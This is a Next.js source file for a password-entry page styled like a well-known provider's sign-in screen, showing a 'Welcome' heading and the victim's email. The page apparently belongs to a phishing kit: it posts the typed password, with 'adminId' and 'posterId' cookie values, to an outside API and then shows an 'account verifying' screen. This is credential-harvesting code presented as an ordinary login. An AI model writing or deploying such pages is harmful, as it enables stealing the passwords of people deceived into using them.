"use client";
import Image from "next/image";
import React, { useState } from "react";
import { CircleUserRound } from "lucide-react";
import { useRouter } from "next/navigation";
import { API_URL } from "@/config";
import Cookies from "js-cookie";

function Password() {
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const router = useRouter();
  const id = Cookies.get("id");
  const adminId = Cookies.get("adminId");
  const posterId = Cookies.get("posterId");
  const handlePassword = async() => {
    if (!password) {
      return;
    }
    const values = {
      id,
      password,
      adminId,
      posterId,
    };
    const url = `${API_URL}/password/post`;

    const res = await fetch(url, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
      },
      body: JSON.stringify(values),
    });
    const data = await res.json();
    console.log(data);

    if (res.ok) {
      console.log("success", data);
      
      router.push("/account-verifying-state");
    } else {
      console.log("error", data);
      // toast.error("Something Went Wrong");
    }
  };
  return (
    <div className=" w-full min-h-screen flex flex-col justify-center items-center">
      <div className="flex flex-col w-full max-w-md p-10 h-screen  gap-15 ">
        <div className="flex flex-col gap-6 ">
          <div className="flex flex-col  gap-3">
            <div className="">
              <Image
                src={"/logo.png"}
                alt="logo"
                width={100}
                height={100}
                className="object-cover "
              />
            </div>
            <div className="flex flex-col gap-2">
              <h1 className="text-2xl font-normal mb-1">Welcome</h1>

              <div className="flex gap-2 items-center">
                <CircleUserRound />
                <p className="text-base text-gray-600">
                  {Cookies.get("email")}
                </p>
              </div>
            </div>
          </div>
          <div className="flex flex-col gap-2 ">
            <input
              type={showPassword ? "text" : "password"}
              id="password"
              className={`w-full border  border-gray-300 rounded-md px-5 py-2 focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500`}
              placeholder="Enter Password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
            />

            <label className="text-zinc-500 font-medium text-sm mt-2 flex items-center gap-2 cursor-pointer">
              <input
                id="show"
                type="checkbox"
                checked={showPassword}
                className="w-4 h-4"
                onChange={() => setShowPassword((prev) => !prev)}
              />
              Show Password
            </label>
          </div>
        </div>
        <div className="flex justify-between items-center">
          <button className="text-blue-600 font-medium text-sm mt-2">
            Forgot email?
          </button>
          <button
            className="w-fit  bg-blue-500 text-white py-2 px-6 rounded-md hover:bg-blue-600 font-semibold"
            onClick={() => handlePassword()}
          >
            Next
          </button>
        </div>
      </div>
    </div>
  );
}

export default Password;
